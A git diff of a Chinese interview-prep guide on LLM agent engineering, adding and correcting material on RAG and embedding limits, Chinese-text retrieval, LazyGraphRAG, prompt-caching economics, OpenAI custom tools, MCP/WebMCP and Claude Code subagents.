 - 坑：LLM-as-judge 有自我偏好与位置偏差，只适合开放式维度，不能替代可执行验证；静态基准有污染风险（用活基准如 Terminal-Bench、SWE-bench Live 应对）；长轨迹评测昂贵难复现，需要环境快照、固定种子与轨迹回放。
 
@@ -2021,7 +2131,7 @@ def react_loop(task, tools, llm, max_steps=25):
 9. **忘记终止条件与护栏** —— 含环 Agent 没有 max iterations / stopping criteria 会成本失控甚至死循环；自主性越强越需要沙箱与 HITL。
 10. **把 reasoning model 与 Agent 范式对立** —— o/R 系列把 CoT/搜索内化，但**系统级**的环境交互、多路径搜索、状态管理仍是 Agent 框架职责，二者互补。
 11. **"长上下文窗口 = 可以全塞进去"** —— 反直觉。lost in the middle / context rot 表明有效注意力随长度衰减，且按 token 计费；正解是按需检索 + compaction + 记忆外化。
-12. **"多智能体更先进所以更好"** —— 错。token 成本约高一个量级（研究型任务输入口径 ~15×），还要付协调成本与评测难度；只有**可并行 + 上下文独立**的高价值任务才值得，不可并行的任务拆代理只会放大错误。
+12. **"多智能体更先进所以更好"** —— 错。token 成本显著更高（Anthropic 双层口径：单 agent ≈ chat ~4×、多智能体 ≈ chat ~15×，即多智能体约为单 agent 的 ~4 倍；研究型任务输入口径），还要付协调成本与评测难度；只有**可并行 + 上下文独立**的高价值任务才值得，不可并行的任务拆代理只会放大错误。
 13. **"有了 reasoning model 就不用研究 prompt 与范式"** —— 错。思考预算调优、模型分级路由、工具与上下文设计、评测护栏全是系统工程；内化 ≠ 万能，且思考模型更贵更慢。
 14. **"接了 MCP 就解决了工具问题"** —— 片面。MCP 解决的是连接标准化（2025-12 捐赠 Linux Foundation 后生态进一步扩大），但工具的语义设计、稳定性仍需治理；更要命的是**安全面**：第三方服务器的工具描述与返回内容是**间接提示注入**的载体，存在 tool poisoning / rug pull / 数据外泄风险，必须叠加权限最小化、不可逆操作 HITL、数据-控制平面分离（CaMeL 思路）、spotlighting、输出过滤与沙箱（见 2.16）。
 15. **"pass@k 高 = 生产可用"** —— 反直觉。pass@k 是"k 次至少成一次"，生产要的是 pass^k（k 次全成）；策略不稳时两者差距巨大（τ-bench 口径 pass@1 ~60% 的系统 pass^8 可跌到 ~25%），可靠性汇报必须给 pass^k。
@@ -2046,7 +2156,7 @@ def react_loop(task, tools, llm, max_steps=25):
    https://arxiv.org/abs/2210.03629
 
 4. **Tree of Thoughts（Yao et al., NeurIPS 2023）+ Graph of Thoughts（Besta et al., AAAI 2024）**
-   理解推理拓扑从树到图的演进；配合 CoT（Wei 2022）、Zero-shot CoT（Kojima 2022, https://arxiv.org/abs/2205.11916 ）与 Self-Consistency（Wang et al., ICLR 2023, https://arxiv.org/abs/2210.03493 ）一起读，形成完整谱系。
+   理解推理拓扑从树到图的演进；配合 CoT（Wei 2022）、Zero-shot CoT（Kojima 2022, https://arxiv.org/abs/2205.11916 ）与 Self-Consistency（Wang et al., ICLR 2023, https://arxiv.org/abs/2203.11171 ）一起读，形成完整谱系。
    ToT: https://arxiv.org/abs/2305.10601 ｜ GoT: https://arxiv.org/abs/2308.09687
 
 5. **Reflexion（Shinn et al., NeurIPS 2023）+ Self-Refine（Madaan et al., NeurIPS 2023）**
@@ -2058,7 +2168,7 @@ def react_loop(task, tools, llm, max_steps=25):
    https://www.langchain.com/blog/planning-agents
 
 7. **Anthropic — *Effective Context Engineering for AI Agents*（2025-09）+ *How We Built Our Multi-Agent Research System*（2025-06）**
-   2025 年上下文工程与多智能体工程实践的权威两篇：前者讲 compaction、子代理隔离与注意力预算，后者给出 orchestrator-worker 的实测经验（含 ~15× token 成本与工具设计教训）。
+   2025 年上下文工程与多智能体工程实践的权威两篇：前者讲 compaction、子代理隔离与注意力预算，后者给出 orchestrator-worker 的实测经验（含"单 agent ≈ chat ~4×、多智能体 ≈ chat ~15×"的 token 成本口径与工具设计教训）。
    https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents ｜ https://www.anthropic.com/engineering/multi-agent-research-system
 
 8. **OpenAI — *A Practical Guide to Building Agents*（2025）+ *Learning to Reason with LLMs*（o1 发布博客，2024-09）**
@@ -2073,7 +2183,7 @@ def react_loop(task, tools, llm, max_steps=25):
     MCP（https://modelcontextprotocol.io ）理解工具生态标准化与规范演进（2025-06 授权/elicitation、2025-11 Tasks、2025-12 捐赠 Linux Foundation）；**CoALA: Cognitive Architectures for Language Agents**（Sumers et al., 2023, https://arxiv.org/abs/2309.02427 ）提供记忆/决策空间的统一框架（可配读 MemGPT, https://arxiv.org/abs/2310.08560 ）；评测基准看 **SWE-bench**（https://arxiv.org/abs/2310.06770 ）、**GAIA**（https://arxiv.org/abs/2311.12983 ）、**τ-bench**（https://arxiv.org/abs/2406.12045 ）。
 
 11. **METR — *Measuring AI Ability to Complete Long Tasks*（2025）+ τ²-bench（Sierra, 2025）**
-    前者给出"50% 可靠完成的任务时长约每 7 个月翻倍"的能力坐标；后者提出 pass^k 可靠性度量并引入双智能体交互评测——回答"Agent 能力与可靠性到底如何"的时效性组合。
+    前者给出"50% 可靠完成的任务时长约每 7 个月翻倍"的能力坐标（METR 后续更新：2024–2025 前沿子集已加速至约 4 个月）；后者提出 pass^k 可靠性度量并引入双智能体交互评测——回答"Agent 能力与可靠性到底如何"的时效性组合。
     https://arxiv.org/abs/2503.14499 ｜ https://arxiv.org/abs/2506.07982
 
 12. **OWASP Top 10 for LLM Applications + CaMeL（Debenedetti et al., DeepMind, 2025）**
@@ -2129,7 +2239,8 @@ Memory 系统与 RAG
 │   │   ├── 代表：OpenAI text-embedding-3、Cohere embed-v3/v4、
 │   │   │        BGE-M3（dense+sparse+多向量三态一体）、Qwen3-Embedding、
 │   │   │        Gemini Embedding、NV-Embed-v2、E5-mistral、GTE、
-│   │   │        nomic-embed、jina-embeddings-v3、Voyage（MongoDB）
+│   │   │        nomic-embed、jina-embeddings-v4（多模态+late interaction 统一）、
+│   │   │        Voyage（MongoDB）
 │   │   ├── 指令式嵌入（instruction-tuned，需区分 query/passage 前缀）
 │   │   └── 选型基准：MTEB / C-MTEB（中文）
 │   ├── 2. 稀疏表示 / 学习型稀疏检索
@@ -2290,6 +2401,14 @@ Memory 系统与 RAG
 - ❌ "换个更大的嵌入模型就能解决检索差"。多数"检索差"其实是 **chunking 问题或 query-doc 措辞鸿沟**，不是嵌入模型问题。先做错误分析（到底是没召回，还是召回了但排序低）。
 - ❌ 用 cosine 相似度阈值做"是否相关"的硬判定。绝对分数跨模型、跨语料不可比，**应用相对排序 + rerank**，而不是拍一个 0.78 的阈值。
 
+#### 单向量 embedding 的理论表达上限（Google DeepMind, 2025）
+
+**考点**：为什么 hybrid / 多向量 / rerank 不只是工程妥协，而是**理论必需**。
+
+**机制**：DeepMind 2025 年论文《On the Theoretical Limitations of Embedding-Based Retrieval》证明：固定维度 d 的单向量嵌入，能精确表示的"top-k 相关文档组合"数量存在**数学上限**（基于 sign-rank 的论证）——一旦任务要求的相关组合复杂度超过该上限，**换更强的模型、喂更多的数据都无解**。作者据此构造 **LIMIT 基准**：查询极其简单（"谁喜欢苹果？"式），只因相关组合覆盖了文档间的所有两两配对，SOTA 单向量模型就大面积失败（recall@100 普遍很低），而 **BM25（超高维稀疏）与 ColBERT 式多向量**不受同一上限约束、表现明显更好。
+
+**面试怎么用**：把本章的 hybrid（2.5）、BGE-M3 三态一体（2.2）、ColBERT late interaction、两段式 rerank 串成一句话——"单向量是**信息瓶颈**：可表示的相关组合随维度只多项式增长，而组合空间指数爆炸，所以稀疏 / 多向量 / 交互式打分是**补齐表达力的理论必需**，不是锦上添花"。追问"那单向量为何仍是主流"：真实查询的相关结构远比 LIMIT 的对抗构造稀疏，且 ANN 基建成熟——正确姿势正是"单向量粗召回 + sparse 兜底精确匹配 + 多向量/cross-encoder 精排"。
+
 ---
 
 #### 2.3 Chunking：被严重低估的一环
@@ -2367,6 +2486,18 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 
 **推理模型时代的检索注记（2025-2026，以下更多是工程经验观察而非定论）：** 深度推理模型（o 系列、DeepSeek-R1/QwQ 类）在实践中对上下文噪声往往**更敏感**——塞 20 个块常常不如喂 3–5 个高相关块让它专注推理；更好的姿势是让模型**在推理链里自己规划检索**（"我需要先查 A 再查 B"）。"检索越多越保险"的直觉在推理模型上经常失效，最终进 prompt 的条数应在自己评估集上消融确定。
 
+#### 中文检索特化：分词、归一化与 C-MTEB（国内面试特色考点）
+
+**考点**："把 RAG 从英文语料换到中文，哪些环节要改？"多数候选人只答"换个中文 embedding"，真正的区分点在**稀疏那一路**。
+
+**BM25 与分词**。中文无空格分隔，BM25 的词项化必须显式分词——这是英文场景不存在的额外环节，两条路线各有取舍：**词级索引**（jieba、Elasticsearch 的 IK analyzer——惯用法 `ik_max_word` 建索引、`ik_smart` 切查询）词项语义完整、精度高、索引小，但受**分词错误与 OOV**（新词、产品名、人名）拖累——查询与文档切法不一致就直接召回失败，需**自定义词典**持续维护领域专名；**字级 / 字 n-gram 索引**（单字或 bigram）零 OOV、任何新词都能召回，代价是索引膨胀、大量字面撞车的噪声命中、精度下降。工程折中是**词级为主、n-gram 兜底**（ES 同字段挂多个 analyzer 分别建索引再融合）——本质上又是一组召回-精度旋钮。
+
+**文本归一化（隐蔽但致命）**。全角/半角（"ＡＰＩ" vs "API"）、繁简体（"臺灣" vs "台湾"）、中英混排大小写，若不在**索引与查询两侧做同一套归一化**，就会出现"同一个词、两个字符串"的隐性 miss。ES 用 char filter / ICU 插件处理，自建管线则在摄取与查询入口统一收口。
+
+**Embedding 侧**。中文选型看 **C-MTEB**（MTEB 中文基准）而非英文榜——同一模型中英榜排名差异可能很大；开源强模型集中在 BGE 系（智源）、GTE（阿里）、Qwen3-Embedding、bce-embedding（有道）等；中英混合语料或跨语检索（中文 query 查英文文档）要选**多语对齐**模型（如 BGE-M3）。
+
+**追问怎么答**："为什么稠密检索受分词影响小？"——嵌入模型的 tokenizer 本身就是子词/字级切分，匹配发生在向量空间、不依赖显式词边界。因此中文 hybrid 里**稀疏路是更脆弱的一路**：分词与归一化质量要单独建 bad case 监控，别把"检索差"一律怪到 embedding 头上。
+
 ---
 
 #### 2.6 RAG vs 长上下文 vs 微调
@@ -2378,7 +2509,7 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 2. **评测幻觉**：Needle-in-a-Haystack（大海捞针）"通过"≠ 真能用——那只是**单跳、字面匹配**的任务。**RULER**（多跳/变量追踪/聚合）、**HELMET**（检索/推理/摘要系统化评测）、**NoLiMa**（去针化、消除表面线索）一致表明：模型的**有效长度远小于标称长度**，很多"长上下文能力"被针式测试系统性高估。2025 年 Chroma 等提出的 **context rot** 进一步刻画这一现象：随上下文增长，模型对远端信息的有效检索能力持续退化——名义窗口靠位置编码缩放（RoPE 的 YaRN/NTK 扩展）撑出来，但训练分布集中在短序列，长尾检索质量系统性变差。
 3. **成本与延迟**：每次请求都带全量文档，token 成本与首 token 延迟随长度线性涨。
 
-**Prompt caching / KV cache 改变了经济账。** Anthropic 提供**显式缓存断点**（`cache_control`，前缀 ≥1024 tokens，TTL 5 分钟/可选 1 小时），缓存命中读取约为常规输入价的 **1/10**，但**写入有溢价**（5 分钟 TTL 写入约 **1.25×**、1 小时 TTL 约 **2×** 常规输入价）——只有前缀被足够多次复用才净赚，TTL 选择直接取决于复用频率；OpenAI 对 ≥1024 tokens 的稳定前缀**自动缓存**、约半价（无写入溢价）；Gemini 提供显式 Context Caching。共性规律：**前缀越稳定、复用次数越多，长上下文越划算**。这直接催生了 CAG：
+**Prompt caching / KV cache 改变了经济账。** Anthropic 提供**显式缓存断点**（`cache_control`，前缀 ≥1024 tokens，TTL 5 分钟/可选 1 小时），缓存命中读取约为常规输入价的 **1/10**，但**写入有溢价**（5 分钟 TTL 写入约 **1.25×**、1 小时 TTL 约 **2×** 常规输入价）——只有前缀被足够多次复用才净赚，TTL 选择直接取决于复用频率；OpenAI 对 ≥1024 tokens 的稳定前缀**自动缓存**、无写入溢价，且命中折扣随代际一路加深：4o 代约为常规输入价的 **1/2** → GPT-4.1 代 **1/4** → GPT-5 代约 **1/10**（已与 Anthropic 命中价同一量级）；Gemini 提供显式 Context Caching。共性规律：**前缀越稳定、复用次数越多，长上下文越划算**。这直接催生了 CAG：
 
 **CAG（Cache-Augmented Generation，2024）。** 把整个知识库**一次性预载进长上下文模型并常驻 KV 缓存**，每次查询只追加 query，**完全跳过实时检索**。适用三前提：知识库**小到放得进上下文**、**准静态**（缓存能被海量查询摊销）、对每次查询的相关性过滤要求不高。优势是零检索延迟、无检索误差传导、架构极简；局限是装不下 TB 级语料、无法按查询去噪（照吃 lost-in-the-middle）、语料一变缓存即失效、按用户隔离时复用率低。**定位：CAG 是 RAG 在"小而静态"场景下的特化/互补，不是替代**（详见题 13）。
 
@@ -2417,7 +2548,19 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 
 **取舍**：GraphRAG 在"多样性/总览性"问题上显著优于 naive RAG，但**索引成本高出数个数量级**（海量 LLM 抽取与摘要调用）、对实体抽取质量敏感、语料更新需增量重建。**后续演进**：**LightRAG**（HKU）用实体+主题双层检索与增量更新降本；**KAG**（蚂蚁/OpenSPG）做 chunk 与 KG 互索引、逻辑式推理引导，在专业垂直域更强；**HippoRAG / HippoRAG 2** 借鉴神经科学海马体"模式补全"思路，在 OpenIE 图上用**个性化 PageRank** 做多跳联想检索，HippoRAG 2 进一步在线学习边权提升多跳效果。
 
+**LazyGraphRAG（Microsoft, 2024.11）——"GraphRAG 索引太贵"这个追问的最新答案。** 思路是把算力从索引期**搬回查询期**：索引期不再用 LLM 抽实体、也不预生成社区摘要，只做轻量的名词短语抽取、共现图构建与社区划分；查询期先用 **BM25 类相关性测试取种子块**，再**沿图迭代深化**（相关性评估 → 扩展到相邻社区 → 只对被选中的子集做 LLM 摘要），按查询预算逐步加深，同一套机制同时覆盖局部与全局问题。微软报告其**索引成本约为原 GraphRAG 的 0.1%**、与 naive 向量 RAG 同一量级，而答案质量持平甚至更优。面试价值：它是 2.3 节"Index-time vs Query-time 权衡"的教科书案例——社区摘要从"建索引时对全语料预付"改为"哪个查询用到哪个社区、就在那时摘要哪个"，天然契合语料高频更新的场景；被追问"GraphRAG 成本"时，答完 LightRAG 再补一句 LazyGraphRAG，层次感立现。
+
 **Agentic RAG。** 把 RAG 从"一次性 pipeline"升级为"Agent 循环"：检索是工具之一，Agent 可以**判断检索结果够不够 → 不够就改写 query 再检 / 换一个数据源 / 分解子问题多跳检索 / 调用计算器或 API 验证 / 必要时承认不知道**。它统一了 Adaptive/Self/Corrective RAG 的思想，是 2025-2026 的主流方向，并已**产品化**：Perplexity、OpenAI Deep Research、Gemini Deep Research 本质都是"agentic 多步搜索 + 阅读 + 综合"。2024 年底起的 **MCP（Model Context Protocol）** 进一步把检索能力标准化为可插拔的 server/工具——"语料库即服务"可被任意 Agent 挂载。代价是延迟、成本、不确定性上升，需要护栏：**最大迭代次数、token/时间预算、工具白名单、每步 trace 可回放、失败回退到单次 RAG**。
+
+#### Agentic search vs 向量索引：coding agent 为什么不建索引
+
+**考点**：2025 年前后的一个显著风向——"给 coding agent 做代码检索，要不要建向量索引？"Claude Code、Cline 等主流 coding agent 给出的答案是**不建**：弃用 embedding 索引，靠 **grep/glob + 多轮 agentic 探索**（搜索 → 读文件 → 顺着 import/引用继续搜）完成检索。
+
+**弃用向量索引的四个理由**：① **stale-indexing**——代码分钟级变更，"改完代码等重嵌"的索引永远落后于磁盘真相，grep 每次查的都是最新状态，零同步成本；② **权限与安全边界**——向量索引是代码的**二次拷贝**，chunk 级 ACL 难做、易泄漏，本地 grep 天然继承文件系统权限，代码不出域；③ **构建与维护成本**——增量重嵌 pipeline（监听变更 → 重切 → 重嵌 → 失效旧向量）本身就是一个需要运维的系统；④ **代码天然适合结构化检索**——命名规范、符号引用、目录层级让精确匹配信噪比极高，且 agentic loop 可**自我纠错**（第一轮没搜到就换关键词再搜），单次检索的召回压力被多轮探索摊薄。
+
+**向量检索何时仍然赢**：自然语言语料（文档、工单、对话记录——没有符号结构可 grep）；语义模糊查询（"哪里处理了限流"，措辞与代码可能毫无字面交集）；超大规模场景（千万行级 monorepo 上多轮 grep 延迟爆炸，需要索引先收敛候选）；以及运行环境没有文件系统访问权的产品形态。
+
+**结论口径（面试必备）**："检索方式跟**介质与任务**走——代码与强结构文本优先 agentic search（grep/AST/LSP），自然语言语料优先向量 + hybrid；**'RAG = 向量库'是 2023 年的过时等式**，如今 R 指'任意检索工具'，向量库只是选项之一。"这与第 2 章"Preloading vs Just-in-Time Retrieval"、第 13 章 C 层的 progressive disclosure / JIT 检索是同一个判断的三个侧面：上下文按需拉取，检索器按介质选型。
 
 ---
 
@@ -2437,7 +2580,7 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 
 要点：**Faithfulness 不需要标准答案**——它只检查"答案 ⊆ 检索上下文"，这正是"无参考评估"的关键，也是它能用于**在线监控**的原因。它把幻觉定义为"超出证据的陈述"。
 
-**更细粒度：RAGChecker（Amazon, 2025）。** 把评估下沉到 **claim（原子陈述）级**，分三组指标：Overall（Answer F1、Faithfulness、Claim Precision/Recall）、Retrieval（Context Relevance/Precision/Recall）、Generation（Claim Recall、Contextual Precision、Faithfulness、Answer Relevancy），并引入 **Noise Sensitivity（噪声敏感度）**——度量"答案被检索到的无关块带偏的程度"，这正是"检索到了但答错"的量化指标。诊断粒度比 RAGAS 更细，且带在线 dashboard，是 2025 年后的推荐补充。
+**更细粒度：RAGChecker（Amazon, 2024，NeurIPS 2024 D&B）。** 把评估下沉到 **claim（原子陈述）级**，分三组指标：Overall（Answer F1、Faithfulness、Claim Precision/Recall）、Retrieval（Context Relevance/Precision/Recall）、Generation（Claim Recall、Contextual Precision、Faithfulness、Answer Relevancy），并引入 **Noise Sensitivity（噪声敏感度）**——度量"答案被检索到的无关块带偏的程度"，这正是"检索到了但答错"的量化指标。诊断粒度比 RAGAS 更细，且带在线 dashboard，是 2025 年后的推荐补充。
 
 **引用质量（可溯源场景必测）：** **ALCE** 系指标度量 **citation precision**（引用的来源真的支持该陈述吗）与 **citation recall**（该引用的陈述都标来源了吗）。"答案对"与"答案对且出处对"是两件事。
 
@@ -2466,6 +2609,7 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 | Prompt caching 与 CAG 的边界 | ⭐⭐⭐ | 稳定前缀缓存命中后长上下文重新划算；CAG 只适合"小而静态"的 KB，不替代 RAG |
 | 记忆生命周期：写入/更新/冲突消解/遗忘 | ⭐⭐⭐ | 好记忆是决策系统不是数据库；ADD/UPDATE/DELETE/NOOP、时序有效性 |
 | Embedding 选型（MTEB）与指令前缀/对称性 | ⭐⭐ | 榜单只作 shortlist，必须自己数据复核；用错 query/passage 前缀掉点；MRL 可截断维度 |
+| 单向量 embedding 的理论上限（LIMIT） | ⭐⭐ | 固定维度可表示的 top-k 相关组合有数学上限（sign-rank）；hybrid/多向量/rerank 是理论必需 |
 | ANN 索引（HNSW vs IVF-PQ vs DiskANN） | ⭐⭐ | HNSW 快但吃内存（efSearch 是线上旋钮），IVF-PQ 省内存损召回，DiskANN 十亿级低内存 |
 | 向量库选型与预/后过滤 | ⭐⭐ | 先问 pgvector/现有 ES；高选择性过滤必须预过滤，ACL 同理 |
 | Faithfulness 的定义与无参考评估 | ⭐⭐ | 答案是否被 context 支持，无需 ground truth；高忠实 ≠ 答案对 |
@@ -2731,11 +2875,11 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
    理解实体图谱 + Leiden 社区检测 + map-reduce 全局摘要的机制，以及它针对"宏观总览问题"的设计动机与索引成本取舍。
    https://arxiv.org/abs/2404.16130
 
-4. **RAGAS 官方文档 + RAGChecker（Amazon, 2025）**
+4. **RAGAS 官方文档 + RAGChecker（Amazon, NeurIPS 2024 D&B）**
    RAGAS 是 Faithfulness / Answer Relevancy / Context Precision / Context Recall 等指标的标准参考；RAGChecker 把评估细化到 claim 级并引入 Noise Sensitivity，是"如何定位 RAG 瓶颈"的现代工具。面试谈评估必引其一。
-   https://docs.ragas.io/ ；https://github.com/claimcheck/ragchecker
+   https://docs.ragas.io/ ；https://arxiv.org/abs/2408.08067 ；https://github.com/amazon-science/RAGChecker
 
-5. **Liu et al. —《Lost in the Middle》（TACL 2023）+ RULER（2024）+ NoLiMa（2025）+ HELMET（2024）**
+5. **Liu et al. —《Lost in the Middle》（TACL 2024）+ RULER（2024）+ NoLiMa（2025）+ HELMET（2024）**
    长上下文位置偏置的经典实证，及其后续系统化评测：一致表明"有效长度远小于标称长度、Needle 测试系统性高估"。回答"RAG vs 长上下文"时最有力的论据链。
    https://arxiv.org/abs/2307.03172 ；RULER: https://arxiv.org/abs/2404.06654
 
@@ -2749,7 +2893,7 @@ Rerank 通常带来**最显著且最便宜**的端到端质量提升，是性价
 
 8. **自适应检索三件套：FLARE（2023）/ Self-RAG（2023）/ CRAG（2024）**
    理解"让模型自己决定检不检、检索结果可不可信、错了怎么救"的演进脉络，是答 Agentic RAG 题的思想源头。
-   FLARE: https://arxiv.org/abs/2305.06983 ；Self-RAG: https://arxiv.org/abs/2310.05029 ；CRAG: https://arxiv.org/abs/2401.15884
+   FLARE: https://arxiv.org/abs/2305.06983 ；Self-RAG: https://arxiv.org/abs/2310.11511 ；CRAG: https://arxiv.org/abs/2401.15884
 
 9. **组合与替代范式：RAFT（检索增强微调, 2024）+ CAG（Chan et al., 缓存增强生成, WWW 2025）**
    一篇讲"微调如何服务于 RAG、降低噪声敏感度"，一篇讲"缓存如何让检索在小而静态场景下消失"。二者一起读，才能把"RAG / 长上下文 / 微调"三角讲出 2025 年的最新形态。
@@ -2967,6 +3111,14 @@ OpenAI 侧对照：
 
 **Token 经济学（容易被忽视）。** 工具定义本身（name + description + schema）计入每次请求的 input tokens；此外启用工具时 API 会自动注入一段启用工具能力的 system prompt（Anthropic 文档给出的量级是 `auto` 约两三百 token，`any`/指定 `tool` 这类强制模式更贵）。10 个描述详尽的工具轻松吃掉 2–3k tokens × 每一轮 × 每一个会话。**对策：prompt caching 缓存工具定义段（Anthropic 的缓存前缀顺序是 tools → system → messages，工具天然是可缓存的最前段）、控制工具数量、用工具检索做 lazy loading（见 2.4）**。对照 OpenAI 的 prompt caching 是全自动的（无需手动标记），Anthropic 需要在 tools 段尾显式打 `cache_control` 断点——多轮会话中，工具定义是两家共同的最优缓存前缀。
 
+**OpenAI 2025H2 工具调用演进：custom tools、文法约束载荷与 allowed_tools（时效考点）。** GPT-5 一代 API（2025-08 起）在工具调用上有三个值得点名的更新：
+
+- **Custom tools（自由文本载荷）**：工具可声明为 `type: "custom"`，模型传参不再是 JSON 对象而是**自由文本**载荷。动机：让模型在 JSON 字符串字段里塞整段 Python/SQL/长文本，转义负担重且易错（换行、引号、反斜杠层层嵌套）；custom tool 把代码/查询当裸文本直接递给执行器，省去 JSON 转义这道损耗。
+- **可选 CFG/正则文法约束**：custom tool 可附一份 lark 风格 grammar（或正则）约束载荷格式，用受约束解码把自由文本限定在指定文法内（如"必须是合法 SQL 子集"）。机制上与 strict 模式同源（都是 grammar-constrained decoding），只是约束对象从 JSON Schema 换成任意 CFG——正好补上"放弃 JSON 后没有 schema 校验"的缺口。
+- **`allowed_tools`**：`tool_choice` 新增取值，在**不改动工具定义全集**的前提下按请求限制本轮可用子集（auto / required 两种模式）。设计要点是**缓存友好**：tools 段前缀保持稳定、缓存不失效，只在采样层收束可选集。这正是本书反复强调的"运行时增删工具会击穿 prompt cache，应以可见性掩码替代"（Manus 掩码 logits，见第 2 章易错点 21 与上文 Token 经济学）的**官方 API 化**。
+
+面试怎么用：被问"工具参数是一大段代码怎么办"→ custom tools + grammar 约束；被问"工具可用性随状态变化怎么办"→ allowed_tools / 掩码而非增删——两问都能借这组特性把答案落到最新 API 层面。
+
 #### 2.3 并行工具调用：模型侧并发 vs 客户端侧并发
 
 这是两个独立维度，面试中很多人混为一谈：
@@ -3062,6 +3214,8 @@ Server 暴露三类 primitive，**控制主体不同**，这是高频考点：
 
 **协议走向（2026 时效考点）。** 现行 spec 版本为 **2026-07-28**：该修订正式弃用 Roots / Sampling / 协议级 Logging 三项外围能力，连同 Dynamic Client Registration（迁往 CIMD），并给出明确迁移路径；基于握手的版本序列止于 2025-11-25，新版本转向**更无状态、会话可选**的架构（提供 `server/discover` 等轻量发现机制）；同时 2025-11-25 形式化的 **SDK 分层体系**为各语言 SDK 划定了特性支持与维护承诺的层级。面试中能报出现行版本号、三项被弃用能力与无状态收敛方向，是"你跟进了协议"的最快证明。
 
+**WebMCP：浏览器侧的 MCP 化提案（2025 提出，非正式标准）。** 由 Google / Microsoft 工程师牵头、在 W3C 社区组孵化的浏览器 API 提案：网页通过 `navigator.modelContext` 一类 JS 接口把**自身声明为 MCP server**，向浏览器内 agent（浏览器助手、扩展）注册结构化工具与上下文。机制上等于把"agent 靠 computer-use 视觉点按 / 解析 DOM"换成"网站主动声明我能做什么"——网站从"被爬"变为"主动提供 agent 接口"，且天然复用页面已有的登录态与人在回路（用户就在页面上，敏感操作可当场确认）。与纯视觉 computer-use 路线是**互补**关系：已适配站点走结构化路径（准确、省 token），未适配的长尾页面仍靠视觉兜底。面试表述注意分寸：这是早期提案、尚非正式 W3C 标准，接口形态可能变化——能报出"提案状态 + 与 computer use 的互补定位"即到位。
+
 #### 2.6 A2A：agent 之间的协议
 
 **定位。** A2A（Agent2Agent）由 Google 于 2025 年 4 月联合 50+ 厂商发布，同年 6 月捐赠给 Linux Foundation。它与 MCP 是**互补分层**而非竞争：MCP 解决"agent 如何接工具/上下文"（纵向集成），A2A 解决"agent 之间如何发现、委托、协作"（横向协作）。一个 A2A agent 内部完全可以用 MCP 接自己的工具。
@@ -3135,6 +3289,7 @@ Server 暴露三类 primitive，**控制主体不同**，这是高频考点：
 | MCP 长时任务（progressToken / progress / cancelled / experimental Tasks） | ⭐⭐ | "工具跑 10 分钟怎么办"的完整答案 |
 | spec 版本时间线与 2026-07-28 弃用项 | ⭐⭐ | freshness 最快证明：现行版本、Roots/Sampling/Logging 弃用 |
 | 两家 strict 模式对比（OpenAI strict vs Anthropic strict） | ⭐⭐ | Anthropic 现已有 strict，别说旧答案 |
+| OpenAI custom tools / 文法约束载荷 / allowed_tools | ⭐ | 2025H2：自由文本载荷 + lark grammar；allowed_tools 是"掩码而非增删"的官方 API 化 |
 | 开源/自托管模型的工具调用（原生 vs 模板式、grammar 约束生成） | ⭐ | 自托管岗必问 |
 | 大规模工具管理（检索、lazy loading、分层路由） | ⭐⭐ | 系统设计题的核心得分点 |
 | MCP vs A2A 的边界与互补关系 | ⭐⭐ | 开放题，考视野 |
@@ -3351,7 +3506,7 @@ Multi-Agent 系统与协作
 │   ├── 共享状态图 (shared graph state, LangGraph) vs Handoff 转交 (OpenAI Agents SDK)
 │   ├── 两种子代理调用语义：agents-as-tools（编排者保留控制权）vs handoff（移交整个会话控制权）
 │   ├── 结构化契约：子任务书（goal / 输出格式 / 工具约束 / 预算）
-│   └── 互操作协议栈：MCP（agent↔工具，stdio/Streamable HTTP + OAuth 2.1）/ A2A（agent↔agent，Task 状态机 + Agent Card）/ ACP / ANP / AGENTS.md
+│   └── 互操作协议栈：MCP（agent↔工具，stdio/Streamable HTTP + OAuth 2.1）/ A2A（agent↔agent，Task 状态机 + Agent Card）/ ACP（历史，已并入 A2A）/ ANP / AGENTS.md
 │       └── 治理格局：Linux Foundation 大伞——AAIF（2025-12，托管 MCP / AGENTS.md / goose 等）＋ A2A（2025-06 捐给 LF 的独立项目）
 ├── 4. 共享记忆 (Shared Memory)
 │   ├── Working memory（上下文窗口内）vs 外部化记忆（artifacts / 文件 / KV store / 向量库）
@@ -3437,6 +3592,16 @@ Anthropic [Building Effective Agents](https://www.anthropic.com/engineering/buil
 5. **调试**：同一输入会有多条都算"正确"的路径，失败难以复现；必须做全链路 tracing（记录决策与协调模式，但脱敏用户数据）。同步执行 worker 易于控制但阻塞；异步提速但结果一致性和错误处理更复杂。
 6. **两个容易被引用的细节**：① 系统效果与消耗的 token/工具调用数强相关——"更贵的跑法"确实更准，所以必须给预算上限做成本护栏；② 工具描述本身就是 prompt，Anthropic 用真实 query 反复迭代工具文档（包括给 worker 的"搜索策略指引"），其收益不亚于改模型。
 
+#### Harness 级 subagent 机制：以 Claude Code 的 Task/subagent 为例
+
+**考点**：面试官追问"orchestrator-worker 落到生产 harness 里长什么样"，能拆出 Claude Code Task 工具（subagent 机制）的四条工程约束即是高分答案：
+1. **双重隔离**：每个 subagent 拥有独立上下文窗口 + 独立工具白名单——主线程历史不带入，工具按最小权限声明（如只读探索型 agent 不给 Edit/Bash 写权限），一次同时实现上下文隔离与权限收敛。
+2. **禁止嵌套 spawn**：subagent 不能再派 subagent，拓扑被硬性限定为一层星型，防止递归扇出失控——成本上界 = 子代理数 × 单代理预算，可静态估算；这是"用 harness 规则替代 prompt 恳求"的典型。
+3. **结构化回传**：子代理只把最终结论以 tool result 形式回传主线程，中间几十步搜索/读文件的过程全部丢弃——天然的上下文压缩，正对应上文"回传压缩摘要而非原文"。
+4. **类型化 agent 定义**：子代理不是临时拼的 prompt，而是配置文件声明的类型（tools 白名单 / model / system prompt），可版本化、可复用——"agent 即配置"。
+
+并行 fan-out 时，每份派发的任务书必须写清目标、期望输出 schema、预算上限（步数/token），与本章反复出现的"子任务书契约"（2.2 与题 8）互为印证：框架层的 delegation prompt 原则，落到 harness 层就是这几个必填字段。**追问怎么答**："何时不该用 subagent？"——需要频繁双向澄清的强耦合子任务：回传只有结论没有过程，来回澄清的成本会吃掉隔离收益（此时 Skills 的渐进披露是更轻的替代，见 2.7）。
+
 #### 2.4 Debate 模式：原理与"祛魅"
 
